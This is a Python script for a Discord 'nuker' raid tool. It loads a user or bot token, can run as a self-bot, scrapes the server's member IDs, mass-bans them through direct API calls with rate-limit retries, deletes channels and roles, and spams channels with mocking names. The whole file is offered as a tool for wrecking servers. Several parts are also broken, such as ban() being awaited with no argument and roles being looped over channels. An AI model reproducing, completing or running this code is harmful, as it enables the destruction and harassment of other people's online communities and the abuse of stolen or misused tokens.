import asyncio
import configparser
import json
import os
import random
import sys
import threading
import time
from configparser import SafeConfigParser
from io import TextIOBase
from itertools import cycle
from random import randint
from threading import Thread
from typing import final

import colorama
import discord
import httpx
import requests
from colorama import Fore, init
from colorama.ansi import clear_screen
from discord import Permissions, guild, member
from discord.ext import commands, tasks
from utils import *

config = json.load(open('XML/config.json'))
prefix = config["Setup"]["Prefix"]
token = config["Setup"]["Token"]
guild = config["Setup"]["Server Id"]
reason = config["Setup"]["Ban Reason"]
members = open('XML/Scraped/members.txt').read().split('\n')

init()

version = '1.3'
api = 'v9'

f = open('text.txt', 'r')
ascii = ''.join(f.readlines())
client = commands.Bot(command_prefix = "!")

channel_names = ('bozos', 'bigLzz', 'wizzed', 'nuked')

def check_token(token: str) -> str:
    if requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token}).status_code == 200:
        return "user"
    else:
        return "bot"

  
token_type = check_token(token)



if token_type == "user":
    headers = {'Authorization': token}
    client = commands.Bot(
        command_prefix=prefix,
        case_insensitive=False,
        self_bot=True
    )


elif token_type == "bot":
    headers = {'Authorization': f'Bot {token}'}
    client = commands.Bot(
        command_prefix=prefix,
        case_insensitive=False
    )

def cls():
  if os.name == 'nt':
    os.system('cls')
  else:
    os.system('clear')    
 
def ban(i):
    json = {
        'delete_message_days': '7',
        'reason': random.choice(reason)
    }
    r = requests.put(
        f"https://discord.com/api/v{randint(6,9)}/guilds/{guild}/bans/{i}", headers=headers, json=json
    )
    
    if r.status_code == 429:
        sys.stdout.write(f"Ratelimited retrying after {r.json()['retry_after']} seconds\n")
        ban(i)
    
    elif r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
            sys.stdout.write(f'Executed member {i}\n')


async def scrape(ctx):
    membercount = 0
    channelcount = 0
    rolecount = 0

    try:
        os.remove("XML/Scraped/members.txt")
    except:
        pass

    with open('XML/Scraped/members.txt', 'a') as f:
        ctx.guild.members
        for member in ctx.guild.members:
            f.write(str(member.id) + "\n")
            membercount += 1
        print(f"Successfully Scraped {membercount} Members!")


@client.event
async def starter():
     print(ascii)
     print(' ')
     print(' ')
     print(' ')
     print(' ')
     print(' ')
     print('                                  \u001b[35mWelcome Back {0.user}'.format(client))
     await asyncio.sleep(3)
     print("\033c")
     print(ascii)
     print('''
             \u001b[35m
 	 		╔══════════════════════════════════════════════╗ 
	 		║                                              ║
	 		║ \u001b[35m[1] - Nuker         ║     \u001b[35m[2] - Raid Tools   ║
	 		║                                              ║
	 		╚══════════════════════════════════════════════╝
	 		\u001b[38;5;33m'''.center(os.get_terminal_size().columns))
     choice= input('                         =>  ')
     try:
         choice = int(choice)
     except:
        return on_ready()
     
     if choice == 1:
        try:
           print('                         Going To main menu')
           await asyncio.sleep(0.5)
           await main_menu()
        except:
            pass

async def main_menu():
    print(ascii)
    print('''
            \u001b[35m
			╔══════════════════════════════════════════════╗
			║ \u001b[35m[1] - Ban Members     ║ \u001b[35m[5] - Spam Roles     ║
			║ \u001b[35m[2] - Del Channels    ║ \u001b[35m[6] - Nuke Server    ║
			║ \u001b[35m[3] - Del Roles       ║ \u001b[35m[8] - Exit           ║
			║ \u001b[35m[4] - Spam Channels   ║                      ║
			╚══════════════════════════════════════════════╝
			\u001b[38;5;33m'''.center(os.get_terminal_size().columns))
    print('                         Enter Choice')
    choice = input('                         =>  ')


    try:
        choice = int(choice)
    except:
        return(main_menu())
    
    #ban all
    if choice == 1:
      print("\033c")  
      print(ascii)
      print('')
      await ban()
      await main_menu()

    #Delete Channels
    if choice == 2:
        for channel in guild.channels:
         try:
          await channel.delete()
         except:
          pass

    #Delete Roles
    if choice == 3:
        for role in guild.channels:
         try:
          await role.delete()
         except:
          pass    

    #Spam Channels
    if choice == 4:
        guild.create_text_channel(random.choice(channel_names))
    print(f"nuked {guild.name}.")
    return    

     

     

@client.event
async def on_ready():
    if token_type == "bot":
        await starter()

@client.event
async def on_connect():
    if token_type == "user":
        await starter()
try:
    cls()
    if token_type == "user":
        client.run(token, bot=False)
    elif token_type == "bot":
        client.run(token)
except:
    print("invalid token")
